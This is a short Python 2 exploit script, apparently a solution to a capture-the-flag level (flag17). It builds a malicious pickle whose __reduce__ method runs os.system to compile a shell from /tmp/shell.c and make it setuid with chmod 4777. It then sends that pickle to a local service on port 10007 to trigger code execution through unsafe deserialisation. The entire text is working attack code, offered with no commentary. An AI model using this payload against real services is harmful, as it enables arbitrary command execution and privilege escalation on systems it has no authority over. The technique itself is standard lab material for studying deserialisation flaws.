import socket
import cPickle
import os


class local_shell(object):
    def __reduce__(self):
        return (os.system,('/usr/bin/cc -o /home/flag17/shell /tmp/shell.c && chmod 4777 /home/flag17/shell',))

shell = cPickle.dumps(local_shell())
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1',10007))
client_socket.send(shell)